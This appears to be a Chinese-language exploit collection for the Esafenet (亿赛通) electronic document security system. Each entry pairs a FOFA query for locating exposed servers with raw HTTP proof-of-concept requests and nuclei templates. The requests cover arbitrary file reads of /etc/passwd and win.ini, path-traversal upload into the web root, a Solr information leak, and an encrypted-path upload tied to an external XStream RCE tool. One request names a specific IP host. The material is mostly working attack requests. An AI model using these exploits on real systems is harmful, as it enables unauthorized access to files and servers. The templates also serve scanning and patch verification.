## 亿赛通-电子文档安全管理系统 Get ViewUploadFile 任意文件读取

#### fofa

> app=亿赛通-电子文档安全管理系统

#### poc

```http
GET /CDGServer3/client/;login;/DecryptApplication?command=ViewUploadFile&filePath=C:/Windows/win.ini&&uploadFileId=1&fileName1=ox9wcxwck7g1 HTTP/1.1
Host: 
```

#### nuclei

```yaml
id: Esafenet-Get-ViewUploadFile-arbitrary-file-read
# 模板的唯一标识，nuclei 扫描期间会输出该内容

info:
# 信息
  name: Esafenet Get ViewUploadFile 任意文件读取
  # 漏洞名称
  author: mewhz
  # 作者
  severity: low
  # 严重程度
  metadata:
  # 元数据
    max-request: 2
  tags: Esafenet
  # 标签，可以通过标签进行扫描

http:
# http 请求
  - method: GET
    # 请求方法
    path:
      - "{{BaseURL}}/CDGServer3/client/;login;/DecryptApplication?command=ViewUploadFile&filePath=C:/Windows/win.ini&uploadFileId=1&fileName1=ox9wcxwck7g1"
      - "{{BaseURL}}/CDGServer3/client/;login;/DecryptApplication?command=ViewUploadFile&filePath=/etc/passwd&uploadFileId=1&fileName1=ox9wcxwck7g1"
      # {{BaseURL}} 使用请求中的 URL 内容

    stop-at-first-match: true
    # 命中第一个匹配就返回

    matchers-condition: and
    # 匹配规则的逻辑关系，and 表示所有匹配条件必须都为 true
    matchers:
    # 匹配规则
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"
          - "\\[(font|extension|file)s\\]"
        condition: or

      - type: status
        # 对状态码进行匹配
        status:
          - 200
```

---

## 亿赛通-电子文档安全管理系统 Post ViewUploadFile 任意文件读取

#### fofa

> app=亿赛通-电子文档安全管理系统

#### poc

```http
POST /CDGServer3/document/UploadFileList;login HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded

command=VeiwUploadFile&filePath=/etc/passwd&fileName1=111111
```

#### nuclei

```yaml
id: Esafenet-Post-ViewUploadFile-arbitrary-file-read
# 模板的唯一标识，nuclei 扫描期间会输出该内容

info:
# 信息
  name: Esafenet Post ViewUploadFile 任意文件读取
  # 漏洞名称
  author: mewhz
  # 作者
  severity: low
  # 严重程度
  metadata:
  # 元数据
    max-request: 2
  tags: Esafenet
  # 标签，可以通过标签进行扫描

http:
  - raw:
    - |
        POST /CDGServer3/document/UploadFileList;login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        command=VeiwUploadFile&filePath=C:/Windows/win.ini&fileName1=111111
      
    - |
        POST /CDGServer3/document/UploadFileList;login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        command=VeiwUploadFile&filePath=/etc/passwd&fileName1=111111
    # {{Hostname}} 替换主机名
    stop-at-first-match: true
    # 命中第一个匹配就返回

    matchers-condition: and
    # 匹配规则的逻辑关系，and 表示所有匹配条件必须都为 true
    matchers:
    # 匹配规则
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"
          - "\\[(font|extension|file)s\\]"
        condition: or

      - type: status
        # 对状态码进行匹配
        status:
          - 200
```

---

## 亿赛通-电子文档安全管理系统 dump 任意文件读取

#### fofa

> app=亿赛通-电子文档安全管理系统

#### poc

```http
POST /solr/flow/debug/dump?param=ContentStreams HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded

stream.url=file:///c:/windows/win.ini
```

#### nuclei

```yaml
id: Esafenet-dump-arbitrary-file-read
# 模板的唯一标识，nuclei 扫描期间会输出该内容

info:
# 信息
  name: Esafenet dump 任意文件读取
  # 漏洞名称
  author: mewhz
  # 作者
  severity: low
  # 严重程度
  metadata:
  # 元数据
    max-request: 2
  tags: Esafenet
  # 标签，可以通过标签进行扫描

http:
  - raw:
    - |
        POST /solr/flow/debug/dump?param=ContentStreams HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        stream.url=file:///etc/passwd
        
    - |
        POST /solr/flow/debug/dump?param=ContentStreams HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        stream.url=file:///c:/windows/win.ini
    # {{Hostname}} 替换主机名
    stop-at-first-match: true
    # 命中第一个匹配就返回

    matchers-condition: and
    # 匹配规则的逻辑关系，and 表示所有匹配条件必须都为 true
    matchers:
    # 匹配规则
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"
          - "\\[(font|extension|file)s\\]"
        condition: or

      - type: status
        # 对状态码进行匹配
        status:
          - 200
```

---

## 亿赛通-电子文档安全管理系统 importFileType.do 文件上传

#### fofa

> app=亿赛通-电子文档安全管理系统

#### poc

```http
POST /CDGServer3/fileType/importFileType.do?flag=syn_user_policy HTTP/1.1
Host: 
Content-Type: multipart/form-data; boundary=c11993ce33b1f63072326e7f9ddb27a5

--c11993ce33b1f63072326e7f9ddb27a5
Content-Disposition: form-data; name="fileshare"; filename="/..\\..\\..\\..\\webapps\\ROOT\\66.txt"

vulntest
--c11993ce33b1f63072326e7f9ddb27a5--
```

虽然会显示操作失败，但实际是上传成功，访问 host/66.txt 

#### nuclei

```yaml
id: Esafenet-importFileType-file-upload
# 模板的唯一标识，nuclei 扫描期间会输出该内容

info:
# 信息
  name: Esafenet importFileType.do 文件上传
  # 漏洞名称
  author: mewhz
  # 作者
  severity: low
  # 严重程度
  metadata:
  # 元数据
    max-request: 2
  tags: Esafenet
  # 标签，可以通过标签进行扫描

http:
# http 请求
  - raw:
    - |
        POST /CDGServer3/fileType/importFileType.do?flag=syn_user_policy HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=c11993ce33b1f63072326e7f9ddb27a5

        --c11993ce33b1f63072326e7f9ddb27a5
        Content-Disposition: form-data; name="fileshare"; filename="/..\\..\\..\\..\\webapps\\ROOT\\66.txt"

        vulntest
        --c11993ce33b1f63072326e7f9ddb27a5--

    - |
        GET /66.txt HTTP/1.1
        Host: {{Hostname}}

    stop-at-first-match: true
    # 命中第一个匹配就返回

    matchers:
    # 匹配规则
      - type: dsl
      # 表达式提取
        dsl:
          - "status_code_1 == 200 && (contains((body_1), 'xmlFail') || contains((body_1), '操作失败'))"
          # 第一个响应码 200 并且第一个 body 中包含 xmlFail 字符串
          - "status_code_2 == 200 && contains((body_2), 'vulntest')"
          # 第二个响应码 200 并且第一个 body 中包含 vulntest 字符串
        condition: and
        # 所有匹配条件必须为 true
```

---

## 亿赛通-电子文档安全管理系统 cores 信息泄露

#### fofa

> app=亿赛通-电子文档安全管理系统

#### poc

```http
GET /solr/admin/cores HTTP/1.1
Host: 
```

#### nuclei

```yaml
id: Esafenet-cores-info-leak
# 模板的唯一标识，nuclei 扫描期间会输出该内容

info:
# 信息
  name: Esafenet cores 信息泄露
  # 漏洞名称
  author: mewhz
  # 作者
  severity: low
  # 严重程度
  metadata:
  # 元数据
    max-request: 2
  tags: Esafenet
  # 标签，可以通过标签进行扫描

http:
# http 请求
  - method: GET
    # 请求方法
    path:
      - "{{BaseURL}}/solr/admin/cores"
      # {{BaseURL}} 使用请求中的 URL 内容

    stop-at-first-match: true
    # 命中第一个匹配就返回

    matchers-condition: and
    # 匹配规则的逻辑关系，and 表示所有匹配条件必须都为 true
    matchers:
    # 匹配规则
      - type: word
        part: body
        words:
          - 'str name="instanceDir"'
          - 'str name="dataDir"'
        condition: or

      - type: status
        # 对状态码进行匹配
        status:
          - 200
```

---

## 亿赛通-电子文档安全管理系统 UploadFileFromClientServiceForClient 文件上传

#### fofa

> app=亿赛通-电子文档安全管理系统

#### poc

```http
POST /CDGServer3/UploadFileFromClientServiceForClient?AHECJIIACHMDAPKFAPLPFJPJHAHIDMFNKENDCLKLHFEKNDMAHGHOJBPEBEBCNIODHIKOBGFOMCPECDMKOHHIKOIPOPMMIOJDEACILAMPMLNLMELAMHAGGJMDLBCGCECCPKMMEIOKCBDGKHPDPFMLNPEKJHDEHNHFHILECBAJELDJNDBAEHOIIKDMHGOEHBIBHCAMDBBLHJGNCCPKDGLABEFHOKDPAKDCMIOHIFJAGCBPOMIKLMGBAGCNBGEGNKGABCOKEIJCMOMKEAKDALJEHMEIPHLLBJPCBKBDHCBAJIKKDKOHINENMDMKCHGKLJOJGDGIGF HTTP/1.1
Host: 113.88.209.0:8090
Content-Type: application/xml;charset=UTF-8

vultest
```

#### 工具

[https://github.com/0xf4n9x/CDGXStreamDeserRCE](https://github.com/0xf4n9x/CDGXStreamDeserRCE)

路径使用工具加密

![](img\1.png)

参考：

[亿赛通漏洞浅析](https://xz.aliyun.com/t/12950)

[亿赛通电子文档安全管理系统XStream反序列化远程代码执行漏洞](https://0xf4n9x.github.io/cdg-xstream-deserialization-arbitrary-file-upload.html)

#### nuclei

```yaml
id: Esafenet-UploadFileFromClientServiceForClient-file-upload
# 模板的唯一标识，nuclei 扫描期间会输出该内容

info:
# 信息
  name: Esafenet UploadFileFromClientServiceForClient 文件上传
  # 漏洞名称
  author: mewhz
  # 作者
  severity: low
  # 严重程度
  metadata:
  # 元数据
    max-request: 2
  tags: Esafenet
  # 标签，可以通过标签进行扫描

http:
# http 请求
  - raw:
    - |
        POST /CDGServer3/UploadFileFromClientServiceForClient?AHECJIIACHMDAPKFAPLPFJPJHAHIDMFNKENDCLKLHFEKNDMAHGHOJBPEBEBCNIODHIKOBGFOMCPECDMKOHHIKOIPOPMMIOJDEACILAMPMLNLMELAMHAGGJMDLBCGCECCPKMMEIOKCBDGKHPDPFMLNPEKJHDEHNHFHILECBAJELDJNDBAEHOIIKDMHGOEHBIBHCAMDBBLHJGNCCPKDGLABEFHOKDPAKDCMIOHIFJAGCBPOMIKLMGBAGCNBGEGNKGABCOKEIJCMOMKEAKDALJEHMEIPHLLBJPCBKBDHCBAJIKKDKOHINENMDMKCHGKLJOJGDGIGF HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=c11993ce33b1f63072326e7f9ddb27a5

        vultest
    - |
        GET /CDGServer3/66.txt HTTP/1.1
        Host: {{Hostname}}

    stop-at-first-match: true
    # 命中第一个匹配就返回

    matchers:
    # 匹配规则
      - type: dsl
      # 表达式提取
        dsl:
          - "status_code_1 == 200"
          # 第一个响应码 200
          - "status_code_2 == 200 && contains((body_2), 'vultest')"
          # 第二个响应码 200 并且第一个 body 中包含 vulntest 字符串
        condition: and
        # 所有匹配条件必须为 true
```

---
